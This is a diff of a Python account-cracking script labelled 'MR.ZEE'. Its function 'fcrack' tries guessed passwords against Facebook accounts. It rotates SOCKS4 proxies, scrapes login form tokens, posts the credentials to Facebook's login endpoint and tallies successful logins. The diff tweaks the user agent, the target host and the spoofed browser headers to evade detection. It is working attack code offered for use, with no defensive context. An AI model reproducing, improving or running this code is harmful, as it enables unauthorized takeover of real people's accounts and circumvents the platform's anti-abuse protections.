@@ -632,10 +632,10 @@ def fcrack(uid,pwx,tl):
 			session = requests.Session()
 			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.ZEE\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
 			sys.stdout.flush()
-			ua = 'Mozilla/5.0 (Linux; Android 10; Neo LTE Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/293.0.0.9.114;]'
+			ua = 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36'
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			free_fb = session.get('https://m.facebook.com').text
+			free_fb = session.get('https://free.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -646,24 +646,25 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'m.facebook.com',
+			header_freefb = {'authority':'free.facebook.com',
 			'upgrade-insecure-requests': '1',
-			'viewport-width': '980',
+			'viewport-width': '1080',
 			'method': 'GET',
 			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-language': 'en-PK,en-GB,en-US;q=0.9,en;q=0.8,en;q=0.7', 
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'accept-language': 'en-US,en;q=0.9', 
 			'dnt':'1', 
 			'x-requested-with':'mark.via.gp', 
 			'sec-fetch-site': 'none',
 			'sec-fetch-mode': 'navigate',
 			'sec-fetch-user': '?1',
 			'sec-fetch-dest': 'document',
-			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
+			'accept-encoding':'gzip, deflate, br',
+			'accept-language': 'en-US,en;q=0.9',
 			'cache-control': 'max-age=0',
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="105", "Google Chrome";v="105"',
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Windows"',
-			"sec-ch-prefers-color-scheme": "light",
+			'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
+			'sec-ch-ua-mobile': '?1',
+			'sec-ch-ua-platform': '"Android"',
 			'user-agent': ua}
 			lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
